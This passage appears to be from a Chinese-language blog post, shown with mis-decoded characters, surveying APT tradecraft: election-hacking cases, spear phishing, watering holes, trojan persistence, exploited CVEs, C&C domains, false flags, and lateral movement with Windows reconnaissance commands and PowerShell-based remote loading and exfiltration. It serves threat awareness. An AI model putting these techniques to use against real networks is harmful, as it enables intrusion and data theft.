title="åœ°ç¼˜æ”¿æ²»"></a>åœ°ç¼˜æ”¿æ²»</h3><ul><li><p>DNCé‚®ä»¶æ³„éœ²ã€ç¾å›½å¤§é€‰</p><ul><li>å¸Œæ‹‰é‡Œé‚®ä»¶é—¨äº‹ä»¶ï¼Œåˆ©ç”¨ç§äººç”µå­é‚®ä»¶å‘å®¶é‡Œç§äººæœåŠ¡å™¨å‘é€å¤§é‡æ¶‰åŠå›½å®¶æœºå¯†çš„ç»å¯†é‚®ä»¶ï¼Œå¤§çº¦6ä¸‡å°ã€‚</li><li>ç›¸å…³ç»†èŠ‚ï¼šå¸Œæ‹‰é‡Œç«é€‰å›¢é˜Ÿä¸»å¸­è¢«é’“é±¼æ”»å‡»ä¸Šé’©ï¼Œæ³„éœ²é‚®ç®±å¯†ç ï¼Œä»è€Œè·å–é‚®ç®±ä¸­çš„é‚®ä»¶ï¼ŒåŒæ ·çš„æ”»å‡»æ–¹æ³•åœ¨å›¢é˜Ÿå…¶ä»–æˆå‘˜ä¸­ä¹Ÿç›¸ç»§æˆåŠŸã€‚é’“é±¼é‚®ä»¶ä½¿ç”¨äº†(Bitly)çŸ­é“¾æ¥æŠ€æœ¯æ¥è¿›è¡Œä¼ªè£…ã€‚</li></ul></li><li><p>æ³•å›½æ€»ç»Ÿå¤§é€‰</p><ul><li>æ”»å‡»ç»„ç»‡ï¼šAPT-28<br>æ–‡æ¡£:Trumpâ€™s_Attack_On_Syria_English.docx<br>æ ¸å¿ƒæ”»å‡»æŠ€æœ¯ï¼š<br>CVE-2017-0262(Wordè¿œç¨‹ä»£ç æ‰§è¡Œ)<br>CVE-2017-0263(Windowsæœ¬åœ°æƒé™å‡çº§)</li></ul></li></ul><h3 id="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"><a href="#æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ" class="headerlink" title="æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ"></a>æ•™è‚²ã€ç§‘ç ”ç³»ç»Ÿ</h3><ul><li>å›½å†…é¡¶å°–å¤§å­¦ã€ç ”ç©¶é™¢</li><li>å›½å†…æµ·äº‹ã€ç”µä¿¡ã€èƒ½æºã€å›½é˜²ã€å†›å·¥ä¸š</li></ul><h2 id="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"><a href="#APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ" class="headerlink" title="APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ"></a>APTæ”»å‡»çš„æŠ€æœ¯æ‰‹æ®µ</h2><h3 id="APTæ”»å‡»çš„ç›®æ ‡"><a href="#APTæ”»å‡»çš„ç›®æ ‡" class="headerlink" title="APTæ”»å‡»çš„ç›®æ ‡"></a>APTæ”»å‡»çš„ç›®æ ‡</h3><ul><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯</p><ul><li><p>PCæ•æ„Ÿæ–‡ä»¶æ‰©å±•å</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>ç§»åŠ¨ç«¯æ•æ„Ÿæ–‡ä»¶</p><ul><li>éŸ³é¢‘ã€ç…§ç‰‡ã€é€šè¯å½•éŸ³ã€å½•åƒã€é€šè¯è®°å½•ã€é€šè®¯å½•ã€çŸ­ä¿¡ã€æ‰‹æœºåŸºæœ¬ä¿¡æ¯ã€åœ°ç†ä½ç½®ä¿¡æ¯</li></ul></li><li><p>æ•æ„Ÿæƒ…æŠ¥ä¿¡æ¯çªƒå–æ–¹å¼</p><ul><li>æ ¸å¿ƒæ€æƒ³ï¼šé€‰æ‹©æ€§çªƒå–ï¼ˆæ”»å‡»è€…å¦‚æœæ´»åŠ¨å¤ªé¢‘ç¹ï¼Œæœ¨é©¬ä¸C&amp;CæœåŠ¡å™¨çš„é€šä¿¡æ¬¡æ•°è¶Šå¤šè¶Šå®¹æ˜“æš´éœ²ï¼‰ã€‚æ•…APTç»„ç»‡ä¸€èˆ¬åªæ”¶é›†ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–è€…æœ‰ç‰¹æ®Šæ–‡ä»¶åçš„æ–‡ä»¶ã€‚</li><li>æ–‡ä»¶ç›´æ¥å›ä¼ ã€Socketé€šä¿¡ã€ ç”µå­é‚®ä»¶</li></ul></li></ul></li><li><p>æ•æ„Ÿæ–‡ä»¶</p></li><li><p>ç»æµåˆ©ç›Š</p></li><li><p>æŒç»­ç›‘æ§</p></li><li><p>ç ´å</p></li><li><p>æ”»å‡»ç›®æ ‡å¹³å°</p><ul><li><p>Windowsã€Androidã€MacOSã€iOS</p></li><li><p>è·¨å¹³å°çš„æ°´å‘æ”»å‡»</p><ul><li>å¸¦æœ‰æ¶æ„ç¨‹åºçš„ä¼ªé€ Flashå‡çº§åŒ…</li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"><a href="#APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"></a>APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ</h3><ul><li><p>é±¼å‰æ”»å‡»(Spear Phishing)</p><ul><li><p>ç›®çš„ï¼šä¸é€šè¿‡æˆæƒè®¿é—®æœºå¯†æ•°æ®</p></li><li><p>æ‰‹æ®µï¼šæœ€å¸¸è§çš„æ–¹å¼æ˜¯é€šè¿‡ç”µå­é‚®ä»¶å‘é€ç»™ç‰¹å®šçš„æ”»å‡»ç›®æ ‡ï¼Œè¯±ä½¿ç›®æ ‡æ‰“å¼€é™„ä»¶ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯é±¼å‰é‚®ä»¶ã€‚</p><ul><li>é’“é±¼é‚®ä»¶ï¼šè¿™ä¸ªæ¦‚å¿µå’Œé±¼å‰é‚®ä»¶ç±»ä¼¼ã€‚ä¸è¿‡ï¼Œé’“é±¼å¤šæ˜¯é’ˆå¯¹æ™®é€šäººçš„æ”»å‡»ï¼Œé’ˆå¯¹æ€§è¾ƒå¼±ï¼Œç²¾ç¡®åº¦è¾ƒä½ã€‚</li></ul></li><li><p>å®æ–½è¿‡ç¨‹ï¼šå‰æœŸå‡†å¤‡-&gt;é‚®ä»¶åˆ¶ä½œ-&gt;é‚®ä»¶æŠ•æ”¾-&gt;æƒ…æŠ¥å›æ”¶</p></li><li><p>é˜²æŠ¤æ–¹æ³•ï¼šç¨å¾®æœ‰ç‚¹å®‰å…¨æ„è¯†å³å¯ï¼Œè®¤çœŸæŸ¥çœ‹é‚®ä»¶æ¥æºï¼Œé™„ä»¶æ‰©å±•åï¼Œç—…æ¯’æ‰«æï¼Œè™šæ‹Ÿæœºï¼Œæ²™ç®±ç­‰ã€‚</p></li></ul></li><li><p>æ°´å‘æ”»å‡»(Water Holing)</p><ul><li><p>æ”»å‡»æ¦‚è¿°ï¼šæ”»å‡»è€…é€šè¿‡åˆ†ææ”»å‡»ç›®æ ‡çš„ç½‘ç»œæ´»åŠ¨è§„å¾‹ï¼Œå¯»æ‰¾æ”»å‡»ç›®æ ‡ç»å¸¸è®¿é—®çš„ç½‘ç«™çš„å¼±ç‚¹ï¼Œå…ˆæ”»ä¸‹è¯¥ç«™ç‚¹å¹¶æ¤å…¥æ”»å‡»ç¨‹åºï¼Œåœ¨æ”»å‡»ç›®æ ‡è®¿é—®è¯¥ç«™ç‚¹æ—¶å®æ–½æ”»å‡»</p></li><li><p>ä»¥æµ·è²èŠ±APTç»„ç»‡çš„æ°´å‘æ”»å‡»ä¸¾ä¾‹</p><ul><li><p>Aæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™çš„å¯ä¿¡ç¨‹åº(æ†ç»‘å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨)</li><li>å¯¹ç›®æ ‡ç½‘ç«™æ’å…¥æ¶æ„JavaScriptç¨‹åº(ä¼ªè£…æˆAdobe Flashæ›´æ–°ç¨‹åº)</li></ul></li><li><p>Bæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™ç«™ç‚¹æŒ‡å®šé“¾æ¥</li></ul></li></ul></li></ul></li><li><p>PCè·³æ¿</p></li><li><p>ç¬¬ä¸‰æ–¹å¹³å°</p><ul><li>APTç»„ç»‡é€šè¿‡ç¤¾äº¤ç½‘ç»œæ¥ä¸‹å‘C&amp;CæŒ‡ä»¤ï¼ŒAPTç»„ç»‡çš„ä¸“ç”¨æœ¨é©¬ä¼šè¯»å–æ–‡ç« ä¸­çš„ç¨‹åºæŒ‡ä»¤æ¥å®ŒæˆæŒ‡å®šçš„æ”»å‡»æ“ä½œ</li><li>å¾®åšã€Twitterã€Facebookã€â€¦</li></ul></li><li><p>æ¶æ„ç¡¬ä»¶ä¸­é—´äººåŠ«æŒ</p><ul><li><p>åœ¨ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­éƒ¨ç½²ç‰©ç†ç¡¬ä»¶è®¾å¤‡ï¼Œé€šè¿‡ä¸­é—´äººæ–¹å¼åŠ«æŒç”¨æˆ·ç½‘ç»œæµé‡ï¼Œæ›¿æ¢æ›´æ–°åŒ…ç­‰è½¯ä»¶</p><ul><li>è¾“å…¥æ³•è½¯ä»¶ã€èŠå¤©è½¯ä»¶ã€ä¸‹è½½è½¯ä»¶ã€å½±éŸ³è½¯ä»¶ã€å®‰å…¨è½¯ä»¶ã€å¾®è½¯ç³»ç»Ÿè½¯ä»¶</li></ul></li><li><p>ä¾‹å­ï¼šç«ç„°ç—…æ¯’</p></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"><a href="#APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"></a>APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡</h3><ul><li><p>ä¸“ç”¨æœ¨é©¬</p><ul><li><p>å¼€æœºè‡ªå¯åŠ¨</p><ul><li><p>ä¿®æ”¹å¿«æ·æ–¹å¼</p></li><li><p>DLL(åŠ¨æ€é“¾æ¥åº“)åŠ«æŒ</p></li><li><p>ä¿®æ”¹æ³¨å†Œè¡¨ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡</p></li><li><p>APTç»„ç»‡ä¸ºä½•æ”¾å¼ƒå¼€æœºè‡ªå¯åŠ¨ï¼Ÿ</p><ul><li><p>ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦ä¸€æ¬¡æ€§æ”»å‡»</p><ul><li>ç«åŠ›ä¾¦å¯Ÿåˆ¤æ–­ç›®æ ‡æ˜¯å¦ä¸ºçœŸå®ç›®æ ‡æ—¶ã€ç›®æ ‡é˜²æŠ¤èƒ½åŠ›å¾ˆå¼ºæ—¶ï¼ˆéƒ½æ˜¯ä¸ºäº†éšè—è‡ªå·±çš„æ”»å‡»</li></ul></li><li><p>ä¾èµ–åŸå§‹æ¯ä½“æ–‡ä»¶è¿è¡Œ</p></li><li><p>ç”¨å…¶ä»–æ–¹æ³•å¯åŠ¨æœ¨é©¬</p><ul><li>æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ã€æˆ–è€…æ†ç»‘åˆ°å…¶ä»–è½¯ä»¶</li><li>åˆ©ç”¨æ¼æ´åŠ«æŒç¯¡æ”¹ç½‘ç»œæµé‡</li></ul></li></ul></li></ul></li><li><p>åŠ å¯†ä¸è‡ªåŠ å¯†</p></li><li><p>æœ¨é©¬å‡çº§æ¢ä»£</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>å‡ºäºæ”»å‡»æŠ€æœ¯æˆæœ¬è€ƒè™‘ã€ç›®æ ‡ç³»ç»Ÿå­˜åœ¨å¤§é‡å·²çŸ¥æ¼æ´ä½†æœªä¿®å¤</p></li><li><p>ç›¸å…³ä¾‹å­</p><ul><li><p>CVE-2012-0158</p><ul><li>å¾®è½¯Officeæ¼æ´(éå¸¸ç¨³å®š)ï¼Œè¿œç¨‹æ”»å‡»è€…è¯±ä½¿ç›®æ ‡æ‰“å¼€ä¸€ä¸ªç»è¿‡ç‰¹æ®Šæ„é€ çš„RTFæ–‡ä»¶ï¼Œåœ¨ç¬¦åˆæ¼æ´æ¡ä»¶ä¸‹ï¼Œå³å¯åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚</li></ul></li><li><p>CVE-2015-0097</p><ul><li>å¾®è½¯Officeçš„ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œå¯å¯¼è‡´ç›®æ ‡é€šè¿‡HTAæ–‡ä»¶ä¸‹è½½æ¶æ„ç¨‹åºåˆ°æœ¬æœºå¹¶æ‰§è¡Œ</li></ul></li><li><p>Android æ¼æ´</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office æ–‡æ¡£æ¼æ´</li><li>Windows ææƒæ¼æ´</li><li>Flash æ¼æ´</li><li>å…¶ä»–0day</li></ul></li><li><p>APTç»„ç»‡æ­¦å™¨ä½¿ç”¨æˆæœ¬åŸåˆ™(0dayã€æˆ–è€…æŠ€æœ¯æˆæœ¬è¾ƒé«˜çš„æ”»å‡»æ‰‹æ®µ)</p><ul><li>æ”»å‡»ç›®æ ‡å…·æœ‰è¶³å¤Ÿçš„æ”»å‡»ä»·å€¼</li><li>ä¸€èˆ¬çš„ä¸“ç”¨æœ¨é©¬æ”»å‡»æ— æ•ˆæˆ–è€…æ— æ³•è¾¾åˆ°é¢„æœŸç›®çš„</li><li>åˆ©ç”¨1dayã€ndayæ”»å‡»ä¾ç„¶æ— æ³•è¾¾åˆ°ç›®çš„æˆ–è€…æ— æ•ˆ</li></ul></li><li><p>APTæ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ç‰¹åˆ«å…³æ³¨ç‚¹ï¼šRAT(Remote Access Trojan)æ–‡ä»¶,è¿œç¨‹è®¿é—®æœ¨é©¬çš„æ–‡ä»¶æ ¼å¼ã€æ–‡ä»¶å½¢æ€ã€åŠŸèƒ½å½¢æ€ã€æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®çš„å˜åŒ–</p></li><li><p>ç›¸å…³æ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ä»PEåˆ°éPEï¼Œä»æœ‰å®ä½“åˆ°æ— å®ä½“</p></li><li><p>å°ä¼—ç¼–ç¨‹è¯­è¨€æ—¥æ¸æµè¡Œ(Delphi\GCC\NSIS\AutoIt</p></li><li><p>æ¨¡å—äº’åŠ¨ï¼Œäº‘æ§æŠ€æœ¯æ¸æˆä¸»æµ</p></li><li><p>æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®è¶Šè—è¶Šæ·±ï¼šä»å¸¸è§çš„ç³»ç»Ÿç›®å½•åˆ°éš¾ä»¥è¿½è¸ªçš„MBR, VBR, ç£ç›˜å›ºä»¶, EFI, BIOS, ç§»åŠ¨å­˜å‚¨è®¾å¤‡çš„éšè—åˆ†åŒº</p></li><li><p>ç‹¬ç«‹ç ”å‘ä¸å§”æ‰˜å®šåˆ¶æˆä¸»æµ</p><ul><li>ä½¿ç”¨å…¬å¼€çš„RATï¼Œç›®çš„æ˜¯è‡ªæˆ‘éšè—å’Œå«ç¥¸ä»–äºº</li><li>ç»å¤§éƒ¨åˆ†çš„APTç»„ç»‡éƒ½æ˜¯åœ¨ç›¸å¯¹ç‹¬ç«‹çš„ç¯å¢ƒä¸‹å®Œæˆæ”»å‡»ä»£ç çš„å¼€å‘å·¥ä½œ</li><li>ä¸æ’é™¤å§”æ‰˜ç¬¬ä¸‰æ–¹ç»„æˆååŠ©å®šåˆ¶å¼€å‘çš„å¯èƒ½æ€§</li></ul></li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„-C-amp-C-Command-and-Control"><a href="#APTæ”»å‡»çš„-C-amp-C-Command-and-Control" class="headerlink" title="APTæ”»å‡»çš„ C&amp;C(Command and Control)"></a>APTæ”»å‡»çš„ C&amp;C(Command and Control)</h3><ul><li>ä¸»è¦ä½œç”¨ï¼š</li></ul><p>1.å‘æ„ŸæŸ“äº†ç›®æ ‡æœºçš„æœ¨é©¬ç¨‹åºå‘é€æ§åˆ¶å‘½ä»¤ï¼Œæä¾›ä¸‹è½½èµ„æº(æ–°æœ¨é©¬ï¼Œæœ¨é©¬æ¨¡å—ï¼Œé…ç½®æ–‡ä»¶ç­‰)<br>2.å›æ”¶æœ¨é©¬ç¨‹åºæ”¶é›†åˆ°çš„æƒ…æŠ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€é‚®ä»¶ç­‰</p><ul><li><p>åœ°åŸŸåˆ†å¸ƒ</p><ul><li><p>ç¾å›½æœ€å¤šã€å…¶æ¬¡ä¸­å›½ã€ä¿„ç½—æ–¯ï¼Œè¥¿ç­ç‰™ï¼Œå¾·å›½å¹¶åˆ—ç¬¬ä¸‰(2015å¹´)</p><ul><li>ä¸€ä¸ªAPTç»„ç»‡å¯èƒ½æ‹¥æœ‰æ•°åä¸ªï¼Œæˆ–è€…å‡ ä¸ªåˆ†å¸ƒäºä¸åŒåœ°åŸŸçš„C&amp;CæœåŠ¡å™¨</li></ul></li></ul></li><li><p>æ³¨å†Œæœºæ„</p><ul><li><p>å›½å†…å¤–APTç»„ç»‡å‡ä½¿ç”¨æˆ–éƒ¨åˆ†ä½¿ç”¨å¢ƒå¤–æœåŠ¡å•†åŠ¨æ€åŸŸåï¼ŒChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>åŠ¨æ€åŸŸåçš„å¥½å¤„ï¼š</li></ul></li></ul></li></ul><p>1.ç›¸å…³æ³¨å†Œä¿¡æ¯ä¸å¯¹å¤–å…¬å¼€(æ— whoisä¿¡æ¯)<br>2.éœ€è¦åŸŸåæŒæœ‰è€…çš„æƒé™æ‰èƒ½æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</p><ul><li><p>æ³¨å†Œåå¥½</p><ul><li><p>æ¨¡ä»¿é‚®ç®±ç±»</p><ul><li>126mailserver ã€mail163ç­‰</li></ul></li><li><p>æ¨¡ä»¿æ€æ¯’è½¯ä»¶ç±»</p><ul><li>safe360ã€risingç­‰</li></ul></li><li><p>æ¨¡ä»¿äº’è”ç½‘å…¬å¸ç±»</p><ul><li>360sc2ã€sohuã€sogouã€sinaç­‰</li></ul></li></ul></li></ul><h2 id="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"><a href="#APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ" class="headerlink" title="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"></a>APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ</h2><h3 id="æƒ…æŠ¥æ”¶é›†"><a href="#æƒ…æŠ¥æ”¶é›†" class="headerlink" title="æƒ…æŠ¥æ”¶é›†"></a>æƒ…æŠ¥æ”¶é›†</h3><ul><li><p>é‡è¦æ€§ï¼šAPTç»„ç»‡å‘åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½ä¼šæ¶ˆè€—åœ¨æƒ…æŠ¥æ”¶é›†ç¯èŠ‚ä¸Šã€‚ä¸ºäº†è¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œæ”»å‡»è€…å¿…é¡»å°½å¯èƒ½åœ°å…¨é¢çš„æ”¶é›†æ”»å‡»ç›®æ ‡ç›¸å…³çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»è®¤çŸ¥æ°´å¹³åˆ°æŒæ¡æ°´å¹³ã€‚</p></li><li><p>å…¬å¼€æƒ…æŠ¥æ”¶é›†</p><ul><li>å®˜æ–¹ç½‘ç«™ã€è¡Œä¸šç½‘ç«™ã€å­¦æœ¯æœŸåˆŠã€è¡Œä¸šä¼šè®®ã€æ–°é—»æŠ¥é“ç­‰</li></ul></li><li><p>åœ°ä¸‹æƒ…æŠ¥æ”¶é›†</p><ul><li>åœ°ä¸‹é»‘å¸‚è´­ä¹°ç¤¾å·¥åº“</li><li>å…¥ä¾µç¬¬ä¸‰æ–¹ç½‘ç«™ä»¥è·å–ç›®æ ‡äººå‘˜ã€ç»„ç»‡çš„æƒ…æŠ¥ä¿¡æ¯</li><li>å‘å…¶ä»–APTç»„ç»‡è´­ä¹°æƒ…æŠ¥ä¿¡æ¯</li></ul></li></ul><h3 id="ç«åŠ›ä¾¦å¯Ÿ"><a href="#ç«åŠ›ä¾¦å¯Ÿ" class="headerlink" title="ç«åŠ›ä¾¦å¯Ÿ"></a>ç«åŠ›ä¾¦å¯Ÿ</h3><ul><li>ç›®çš„ï¼šæ”¶é›†æ”»å‡»ç›®æ ‡ç½‘ç»œæˆ–è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€åˆ¤æ–­æ”»å‡»ç›®æ ‡çš„çœŸä¼ª(æ˜¯å¦ä¸ºè™šæ‹Ÿæœº)ã€é˜²å¾¡èƒ½åŠ›ã€æ”»å‡»ä»·å€¼ã€‚ä»¥åŠæ–¹ä¾¿åæœŸæ¨ªå‘ç§»åŠ¨çš„å‡†ç¡®æ€§ã€‚</li><li>ä¸»æœºä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä¸»æœºåç§°ã€æœ¬åœ°ç”¨æˆ·åç­‰</li><li>ç½‘ç»œä¿¡æ¯ï¼šä¸»è¦æ˜¯IPåœ°å€ã€ç½‘å…³ä¿¡æ¯</li><li>åº”ç”¨ç¨‹åºä¿¡æ¯åŠç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¾®è½¯Officeã€å¾®è½¯Internet Explorer</li><li>ç£ç›˜ä¿¡æ¯ã€å½“å‰è¿›ç¨‹ä¿¡æ¯ç­‰</li></ul><h3 id="ä¾›åº”é“¾æ”»å‡»"><a href="#ä¾›åº”é“¾æ”»å‡»" class="headerlink" title="ä¾›åº”é“¾æ”»å‡»"></a>ä¾›åº”é“¾æ”»å‡»</h3><ul><li><p>æ”»å‡»åŸç†</p><ul><li>å½“æ”»å‡»ç›®æ ‡æœ¬èº«çš„é˜²å¾¡æªæ–½ç‰¹åˆ«å®Œå–„æ—¶ï¼Œæˆ–åˆå§‹æ”»å‡»æ— æ³•è¾¾åˆ°æ•ˆæœï¼Œå¯¹ç›®æ ‡ç›¸å…³çš„å‘¨è¾¹ä¼ä¸šã€äººå‘˜ã€ä¾›åº”é“¾è¿›è¡Œæ”»å‡»ï¼Œæœ‰å¯èƒ½å–å¾—è¾ƒå¥½çš„æ•ˆæœã€‚</li></ul></li><li><p>å…¸å‹æ¡ˆä¾‹</p><ul><li>éœ‡ç½‘ç—…æ¯’ã€Havex</li></ul></li></ul><h3 id="å‡æ——è¡ŒåŠ¨"><a href="#å‡æ——è¡ŒåŠ¨" class="headerlink" title="å‡æ——è¡ŒåŠ¨"></a>å‡æ——è¡ŒåŠ¨</h3><ul><li><p>æ¦‚è¿°</p><ul><li><p>ä¹Ÿå«ä¼ªæ——è¡ŒåŠ¨ï¼Œæ˜¯éšè”½è¡ŒåŠ¨çš„ä¸€ç§ã€‚é€šè¿‡ä½¿ç”¨å…¶ä»–ç»„ç»‡çš„æ——å¸œã€åˆ¶æœç­‰æ‰‹æ®µè¯¯å¯¼å…¬ä¼—ã€ä½¿å…¬ä¼—è®¤ä¸ºè¯¥æ”»å‡»æ˜¯å…¶ä»–æ”»å‡»ç»„ç»‡æ‰§è¡Œã€‚</p><ul><li>ç›¸å…³æˆ˜æœ¯æœ¯è¯­ï¼šæ‹Ÿæ€ã€è¯±é¥µã€æ··æ·†ã€ä¼ªè£…ã€å¹²æ‰°</li></ul></li></ul></li><li><p>ç±»å‹</p><ul><li><p>é¢„è®¾é™·é˜±</p><ul><li>æ ·æœ¬æ–‡ä»¶ã€C&amp;CæœåŠ¡å™¨åŸŸåã€ç‰¹æ®Šå­—ç¬¦ä¸²ã€ä¸Šçº¿å¯†ç ã€è¯±é¥µæ–‡æ¡£å±æ€§ä¿¡æ¯ç­‰</li></ul></li><li><p>äº‹åæ©ç›–</p><ul><li>æ”»å‡»æˆåŠŸåï¼Œå¯¹åŸŸåwhoisã€IPåœ°å€ç­‰ä¿¡æ¯è¿›è¡Œä¼ªè£…</li></ul></li></ul></li><li><p>å†’å……å¯¹è±¡</p><ul><li>å†’å……å…¶ä»–APTç»„ç»‡</li><li>å†’å……æ™®é€šç”¨æˆ·</li></ul></li><li><p>å›½å®¶çº§æƒ…æŠ¥æœºæ„å¯¹è¯¥è¡ŒåŠ¨çš„è§‚ç‚¹</p><ul><li><p>äº”çœ¼è”ç›Ÿ</p><ul><li>ä¸æ¬ºéª—ç›¸å…³çš„ç­–ç•¥ï¼šæš—åŒº(DarkSpace)ã€èœœç½(Honeypot)ã€èœœä»¤(Honeytoken)ã€èœœç½‘(Honeynet)ã€å‡æ——è¡ŒåŠ¨(False Flag)ã€æ•ˆæœ(Effects)</li></ul></li><li><p>äº”çœ¼è”ç›Ÿå¯¹å‡æ——è¡ŒåŠ¨çš„è§‚ç‚¹ï¼š1.æœ‰æ„åˆ¶é€ æ”»å‡»ç›®æ ‡ä¸è¢«å«ç¥¸å›½æˆ–ç»„ç»‡é—´ç´§å¼ çš„æ•Œå¯¹æ°”æ°›ï¼Œä»¥å®ç°æŸç§æ”¿æ²»æˆ–ç»æµç›®çš„ 2.æ›´å¥½åœ°éšè—è‡ªå·±ï¼Œé¿å…æš´éœ²ï¼Œæ”¶è·æ›´å¤§åˆ©ç›Šã€‚</p></li></ul></li></ul><h3 id="å‘¨æœŸæ€§è¢­æ‰°"><a href="#å‘¨æœŸæ€§è¢­æ‰°" class="headerlink" title="å‘¨æœŸæ€§è¢­æ‰°"></a>å‘¨æœŸæ€§è¢­æ‰°</h3><ul><li>å‘¨ä¸€ã€äºŒï¼ˆå·¥ä½œæ—¥å¤„ç†é‚®ä»¶ã€æ–‡ä»¶é«˜å³°æœŸï¼‰</li><li>å¤§å‹èŠ‚æ—¥ï¼ˆå¦‚å›½åº†èŠ‚ã€æ˜¥èŠ‚ç­‰ï¼‰</li></ul><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>ç›®çš„ï¼š</li></ul><p>1.è¿›ä¸€æ­¥åœ¨æ„ŸæŸ“çš„ç›®æ ‡æœºå™¨ä¸Šè·å–æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯<br>2. å€ŸåŠ©å—æ„ŸæŸ“çš„æœºå™¨ï¼Œæ¢æµ‹å‘¨è¾¹å…¶ä»–è®¾å¤‡çš„æƒ…å†µæˆ–ç›´æ¥å‘å‘¨è¾¹è®¾å¤‡å‘åŠ¨æ”»å‡»</p><ul><li><p>æ¨ªå‘ç§»åŠ¨æ”»å‡»æ­¥éª¤</p><ul><li>ä¾¦å¯Ÿå’Œè¯†åˆ«ç½‘ç»œæ‹“æ‰‘ã€è·å–åŸŸè®¡ç®—æœºä¿¡æ¯ã€å½“å‰è®¡ç®—æœºç›¸å…³ä¸»æœºä¿¡æ¯ã€ç½‘å¡ä¿¡æ¯ã€è·¯ç”±ä¿¡æ¯ç­‰</li><li>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºæœåŠ¡åŠçŠ¶æ€ã€è·å–æŒ‡å®šIPå…±äº«ä¿¡æ¯ã€å…±äº«ç›®å½•ã€æ‰«æå†…ç½‘æœºå™¨è¿œç¨‹ç«¯å£ç­‰</li><li>è¡¥å……åŸæœ‰æœ¨é©¬æ²¡æœ‰çš„åŠŸèƒ½ã€çªƒå–æœ¬æœºæ›´å¤šä¿¡æ¯ã€å‘å‘¨è¾¹å…¶ä»–è®¾å¤‡å‘åŠ¨æ”»å‡»</li><li>å¸¸ç”¨å‘½ä»¤ï¼šnet viewã€ipconfig /allã€netstat -a/nã€nbstat -Aã€systeminfoã€tracert -w 1000 8.8.8.8ã€pingã€telnetã€åˆ©ç”¨PowerShellè¿œç¨‹åŠ è½½æœ¨é©¬æˆ–è€…ä¸Šä¼ æƒ…æŠ¥ä¿¡æ¯åˆ°C&amp;CæœåŠ¡å™¨</li></ul></li></ul><h3 id="ä¼ªè£…æœ¯"><a href="#ä¼ªè£…æœ¯" class="headerlink" title="ä¼ªè£…æœ¯"></a>ä¼ªè£…æœ¯</h3><ul><li><p>ç¤¾ä¼šå·¥ç¨‹å­¦ä¼ªè£…</p><ul><li>é‚®ä»¶å†…å®¹ä¼ªè£…</li><li>é‚®ä»¶èº«ä»½ä¼ªè£…</li></ul></li><li><p>æ–‡ä»¶è§†è§‰ä¼ªè£…</p><ul><li>æ–‡ä»¶å</li><li>æ–‡ä»¶æ‰©å±•å</li><li>æ–‡ä»¶å›¾æ ‡</li></ul></li><li><p>å¿«æ·æ–¹å¼ä¼ªè£…</p><ul><li>å°†æ”»å‡»ä»£ç æ–‡ä»¶å’Œä¸€ä¸ªæŒ‡å‘æ”»å‡»ä»£ç 